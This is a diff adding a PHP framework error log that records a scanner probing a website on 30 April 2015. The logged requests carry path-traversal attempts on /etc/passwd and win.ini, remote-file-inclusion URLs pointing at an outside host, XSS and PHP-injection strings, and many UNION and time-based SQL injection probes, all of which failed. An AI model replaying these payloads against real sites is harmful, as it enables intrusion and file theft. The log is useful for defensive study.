@@ -1,0 +1,588 @@
+[ 2015-04-30T03:11:31+08:00 ] 42.120.145.27 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000313s ]
+ERR: 无法加载模块:Robots
+
+[ 2015-04-30T09:00:14+08:00 ] 123.125.71.30 /robots.txt
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000250s ]
+ERR: 无法加载模块:Robots
+
+[ 2015-04-30T14:02:10+08:00 ] 116.204.86.124 /favicon.ico
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000316s ]
+ERR: 无法加载模块:Favicon
+
+[ 2015-04-30T14:55:35+08:00 ] 121.42.0.15 /uploadfile/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000269s ]
+ERR: 无法加载模块:Uploadfile
+
+[ 2015-04-30T14:55:36+08:00 ] 121.42.0.15 /login.action?debug=browser
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000267s ]
+ERR: 无法加载模块:Login
+
+[ 2015-04-30T14:55:38+08:00 ] 121.42.0.15 /index.action?debug=browser
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000315s ]
+ERR: 无法加载模块:Index
+
+[ 2015-04-30T14:55:41+08:00 ] 121.42.0.15 /index.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000280s ]
+ERR: 无法加载模块:Index
+
+[ 2015-04-30T14:55:44+08:00 ] 121.42.0.15 /login.action?redirect%3A%25%7Bnew+java.lang.String%28%27http%3A%2F%2Fxxxxxxxxxxxxx%27%29%7D
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000287s ]
+ERR: 无法加载模块:Login
+
+[ 2015-04-30T14:55:46+08:00 ] 121.42.0.15 /log/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000301s ]
+ERR: 无法加载模块:Log
+
+[ 2015-04-30T14:55:49+08:00 ] 121.42.0.15 /logs/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000272s ]
+ERR: 无法加载模块:Logs
+
+[ 2015-04-30T14:55:50+08:00 ] 121.42.0.15 /uploadfiles/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000301s ]
+ERR: 无法加载模块:Uploadfiles
+
+[ 2015-04-30T14:55:51+08:00 ] 121.42.0.15 /web/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000267s ]
+ERR: 无法加载模块:Web
+
+[ 2015-04-30T14:55:52+08:00 ] 121.42.0.15 /data/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000290s ]
+ERR: 无法加载模块:Data
+
+[ 2015-04-30T14:55:53+08:00 ] 121.42.0.15 /backup/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000269s ]
+ERR: 无法加载模块:Backup
+
+[ 2015-04-30T14:55:54+08:00 ] 121.42.0.15 /uploads/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000324s ]
+ERR: 无法加载模块:Uploads
+
+[ 2015-04-30T14:55:56+08:00 ] 121.42.0.15 /db/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000297s ]
+ERR: 无法加载模块:Db
+
+[ 2015-04-30T14:55:57+08:00 ] 121.42.0.15 /config/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000333s ]
+ERR: 无法加载模块:Config
+
+[ 2015-04-30T14:56:03+08:00 ] 121.42.0.15 /?m=%2Fetc%2Fpasswd&c=oauth2&a=index&type=corklist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000025s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000415s ]
+ERR: 无法加载模块:/etc/passwd
+
+[ 2015-04-30T14:56:09+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&c=oauth2&a=index&type=corklist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000053s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000368s ]
+ERR: 无法加载模块:../../../../../../../../etc/passwd
+
+[ 2015-04-30T14:56:14+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&c=oauth2&a=index&type=corklist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000258s ]
+ERR: 无法加载模块:../../../../../../../../etc/passwd.jpg
+
+[ 2015-04-30T14:56:20+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&c=oauth2&a=index&type=corklist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000262s ]
+ERR: 无法加载模块:../../../../../../../../../../etc/passwd%00
+
+[ 2015-04-30T14:56:25+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&c=oauth2&a=index&type=corklist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000305s ]
+ERR: 无法加载模块:../../../../../../../../windows/win.ini
+
+[ 2015-04-30T14:56:33+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&c=oauth2&a=index&type=corklist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000034s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000488s ]
+ERR: 无法加载模块:../../../../../../../../windows/win.ini.jpg
+
+[ 2015-04-30T14:56:39+08:00 ] 121.42.0.15 /?m=http://112.124.36.187/s.txt&c=oauth2&a=index&type=corklist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000281s ]
+ERR: 无法加载模块:Http://112.124.36.187/s.txt
+
+[ 2015-04-30T14:56:45+08:00 ] 121.42.0.15 /?m=http%3A%2F%2F112.124.36.187%2Fs.txt&c=oauth2&a=index&type=corklist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000263s ]
+ERR: 无法加载模块:Http://112.124.36.187/s.txt
+
+[ 2015-04-30T14:56:50+08:00 ] 121.42.0.15 /?m=a_long_name_file_not_exist&c=oauth2&a=index&type=corklist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000317s ]
+ERR: 无法加载模块:A_long_name_file_not_exist
+
+[ 2015-04-30T14:56:54+08:00 ] 121.42.0.15 /upfiles/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000265s ]
+ERR: 无法加载模块:Upfiles
+
+[ 2015-04-30T14:56:57+08:00 ] 121.42.0.15 /?m=%27%22%3E%3CscRipt%3Ealert%2898733%29%3C%2FsCript%3E&c=oauth2&a=index&type=corklist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000328s ]
+ERR: 无法加载模块:'">alert(98733)
+
+[ 2015-04-30T14:57:25+08:00 ] 121.42.0.15 /htdocs/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000258s ]
+ERR: 无法加载模块:Htdocs
+
+[ 2015-04-30T14:57:26+08:00 ] 121.42.0.15 /?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&c=oauth2&a=index&type=corklist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000264s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}
+
+[ 2015-04-30T14:57:31+08:00 ] 121.42.0.15 /?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&c=oauth2&a=index&type=corklist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000281s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}\
+
+[ 2015-04-30T14:57:35+08:00 ] 121.42.0.15 /?m=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&c=oauth2&a=index&type=corklist
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000264s ]
+ERR: 无法加载模块:Print(md5(this_is_a_test_string));die();/*
+
+[ 2015-04-30T14:57:40+08:00 ] 121.42.0.15 /upfile/
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000320s ]
+ERR: 无法加载模块:Upfile
+
+[ 2015-04-30T15:11:21+08:00 ] 121.42.0.15 /?m=Cork%2C%27%22%29%29.%29%29%5D%29&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000289s ]
+ERR: 无法加载模块:Cork,'")).))])
+
+[ 2015-04-30T15:11:22+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+CONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000271s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
+
+[ 2015-04-30T15:11:23+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+CONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000273s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
+
+[ 2015-04-30T15:11:23+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+NULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000270s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
+
+[ 2015-04-30T15:11:24+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+CONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%2cNULL%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000353s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
+
+[ 2015-04-30T15:11:24+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+NULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000288s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
+
+[ 2015-04-30T15:11:25+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+NULL%2cNULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000262s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
+
+[ 2015-04-30T15:11:25+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+CONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%2cNULL%2cNULL%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000296s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
+
+[ 2015-04-30T15:11:26+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+NULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%2cNULL%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000298s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
+
+[ 2015-04-30T15:11:26+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+NULL%2cNULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000290s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
+
+[ 2015-04-30T15:11:27+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+NULL%2cNULL%2cNULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000257s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
+
+[ 2015-04-30T15:11:27+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+CONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%2cNULL%2cNULL%2cNULL%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000271s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL,NULL#
+
+[ 2015-04-30T15:11:28+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+NULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%2cNULL%2cNULL%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000295s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL,NULL#
+
+[ 2015-04-30T15:11:28+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+NULL%2cNULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%2cNULL%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000261s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL,NULL#
+
+[ 2015-04-30T15:11:29+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+NULL%2cNULL%2cNULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%2cNULL%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000270s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71),NULL#
+
+[ 2015-04-30T15:11:29+08:00 ] 121.42.0.15 /?m=Cork%27%20UNION+ALL+SELECT+NULL%2cNULL%2cNULL%2cNULL%2cCONCAT%280x716b756a71%2c0x4b5163596666574b5461%2c0x7170656b71%29%23&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000280s ]
+ERR: 无法加载模块:Cork' UNION ALL SELECT NULL,NULL,NULL,NULL,CONCAT(0x716b756a71,0x4b5163596666574b5461,0x7170656b71)#
+
+[ 2015-04-30T15:11:30+08:00 ] 121.42.0.15 /?m=Cork%20AND%20SLEEP%285%29&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000282s ]
+ERR: 无法加载模块:Cork AND SLEEP(5)
+
+[ 2015-04-30T15:11:30+08:00 ] 121.42.0.15 /?m=Cork%3B%20SELECT%20PG_SLEEP%285%29--&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000287s ]
+ERR: 无法加载模块:Cork; SELECT PG_SLEEP(5)--
+
+[ 2015-04-30T15:11:31+08:00 ] 121.42.0.15 /?m=Cork%3B%20SELECT%20SLEEP%285%29--%20&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000281s ]
+ERR: 无法加载模块:Cork; SELECT SLEEP(5)-- 
+
+[ 2015-04-30T15:11:31+08:00 ] 121.42.0.15 /?m=Cork'%3B%20SELECT%20SLEEP%285%29--%20&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000281s ]
+ERR: 无法加载模块:Cork'; SELECT SLEEP(5)-- 
+
+[ 2015-04-30T15:11:31+08:00 ] 121.42.0.15 /?m=Cork%20WAITFOR%20DELAY%20%270%3A0%3A5%27--&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000279s ]
+ERR: 无法加载模块:Cork WAITFOR DELAY '0:0:5'--
+
+[ 2015-04-30T15:14:53+08:00 ] 121.42.0.15 /?m=%2Fetc%2Fpasswd&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000297s ]
+ERR: 无法加载模块:/etc/passwd
+
+[ 2015-04-30T15:16:36+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000314s ]
+ERR: 无法加载模块:../../../../../../../../etc/passwd
+
+[ 2015-04-30T15:17:14+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000270s ]
+ERR: 无法加载模块:../../../../../../../../etc/passwd.jpg
+
+[ 2015-04-30T15:17:56+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000283s ]
+ERR: 无法加载模块:../../../../../../../../../../etc/passwd%00
+
+[ 2015-04-30T15:20:59+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000327s ]
+ERR: 无法加载模块:../../../../../../../../windows/win.ini
+
+[ 2015-04-30T15:21:52+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000017s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000284s ]
+ERR: 无法加载模块:../../../../../../../../windows/win.ini.jpg
+
+[ 2015-04-30T15:23:19+08:00 ] 121.42.0.15 /?m=http://112.124.36.187/s.txt&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000014s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000276s ]
+ERR: 无法加载模块:Http://112.124.36.187/s.txt
+
+[ 2015-04-30T15:24:20+08:00 ] 121.42.0.15 /?m=http%3A%2F%2F112.124.36.187%2Fs.txt&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000282s ]
+ERR: 无法加载模块:Http://112.124.36.187/s.txt
+
+[ 2015-04-30T15:24:29+08:00 ] 121.42.0.15 /?m=a_long_name_file_not_exist&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000288s ]
+ERR: 无法加载模块:A_long_name_file_not_exist
+
+[ 2015-04-30T15:24:35+08:00 ] 121.42.0.15 /?m=%27%22%3E%3CscRipt%3Ealert%2898733%29%3C%2FsCript%3E&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000016s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000281s ]
+ERR: 无法加载模块:'">alert(98733)
+
+[ 2015-04-30T15:26:41+08:00 ] 121.42.0.15 /?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000375s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}
+
+[ 2015-04-30T15:26:45+08:00 ] 121.42.0.15 /?m=%24%7B%40print%28md5%28this_is_a_test_string%29%29%7D%5C&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000294s ]
+ERR: 无法加载模块:${@print(md5(this_is_a_test_string))}\
+
+[ 2015-04-30T15:26:48+08:00 ] 121.42.0.15 /?m=print%28md5%28this_is_a_test_string%29%29%3Bdie%28%29%3B%2F*&a=cork&corkid=99
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000018s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000310s ]
+ERR: 无法加载模块:Print(md5(this_is_a_test_string));die();/*
+
+[ 2015-04-30T15:27:53+08:00 ] 121.42.0.15 /?m=%2Fetc%2Fpasswd&a=success&openid=ou9X8tuqZvWEKFW-J-QqWjIInthE
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000019s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000305s ]
+ERR: 无法加载模块:/etc/passwd
+
+[ 2015-04-30T15:27:59+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&a=success&openid=ou9X8tuqZvWEKFW-J-QqWjIInthE
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000024s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000312s ]
+ERR: 无法加载模块:../../../../../../../../etc/passwd
+
+[ 2015-04-30T15:28:04+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00.jpg&a=success&openid=ou9X8tuqZvWEKFW-J-QqWjIInthE
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000020s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000351s ]
+ERR: 无法加载模块:../../../../../../../../etc/passwd.jpg
+
+[ 2015-04-30T15:28:11+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%2500&a=success&openid=ou9X8tuqZvWEKFW-J-QqWjIInthE
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000270s ]
+ERR: 无法加载模块:../../../../../../../../../../etc/passwd%00
+
+[ 2015-04-30T15:28:16+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini&a=success&openid=ou9X8tuqZvWEKFW-J-QqWjIInthE
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000294s ]
+ERR: 无法加载模块:../../../../../../../../windows/win.ini
+
+[ 2015-04-30T15:28:20+08:00 ] 121.42.0.15 /?m=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2Fwin.ini%00.jpg&a=success&openid=ou9X8tuqZvWEKFW-J-QqWjIInthE
+INFO: [ app_init ] --START--
+INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000015s ]
+INFO: [ app_init ] --END-- [ RunTime:0.000381s ]
+ERR: 无法加载模块:../../../../../../../../windows/win.ini.jpg
+
